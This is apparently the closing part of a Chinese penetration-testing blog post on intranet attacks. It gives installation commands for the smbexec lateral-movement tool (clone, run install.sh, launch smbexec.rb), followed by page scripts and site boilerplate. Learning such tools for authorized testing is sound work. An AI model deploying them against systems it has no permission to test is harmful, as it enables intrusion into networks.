+<p>git clone <a href="https://github.com/brav0hax/smbexec.git">https://github.com/brav0hax/smbexec.git</a><br>cd smbexec<br>chmod +x install.sh &amp;&amp; ./install.sh</p>
+<p>选择系统</p>
+<p>选择安装路径，默认会将 smbexec 安装在 /opt 目录下</p>
+<p>ruby smbexec.rb</p>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JohnScott <br/>
+        
+        原文链接 : <a href="">https://github.com/liuxue5213/liuxue5213.github.io/2022/63%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share"
+  style="margin-top: -2rem"
+  data-wechat-qrcode-title="<p>微信扫一扫</p>"
+  data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>"
+   data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter" 
+  
+>
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async>
+  
+
+  
+    <div id="reward">
+  
+    <p id="reward-meta">知识 & 情怀 | 二者兼得</p>
+  
+  <button id="reward-btn">
+    
+    <span>感谢您的关心</span>
+  </button>
+  <div id="reward-qrcode">
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/wechat.png" alt="微信扫一扫">
+        <p class="qrcode-meta">微信扫一扫</p>
+      </div>
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/alipay.png" alt="支付宝扫一扫">
+        <p class="qrcode-meta">支付宝扫一扫</p>
+      </div>
+    
+  </div>
+
+</div>
+
+<script>
+  (() => {
+    let button = document.querySelector('#reward-btn'),
+      qrcode = document.querySelector('#reward-qrcode'),
+      display = false;
+    
+    button.addEventListener('click', () => {
+      qrcode.style.display = display ? 'none' : 'block'
+      display = !display
+    }, false)
+  })()
+</script>
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">
+              #信息搜集
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/2022/62%E5%BC%80%E6%94%BE%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5%E6%90%9C%E9%9B%86/" target="_self">62开放漏洞情报搜集</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/2022/64%E7%A5%A8%E6%8D%AE/" target="_self">64票据</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz",
+      appKey: "6VNHrdDAu0JKJXxyMajHk6qD",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz", "6VNHrdDAu0JKJXxyMajHk6qD");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw">BMW</a> | Made With 💗 | Powered by <a target="_blank" rel="noopener" href="https://godbmw.com/">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2015, 0, 1).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
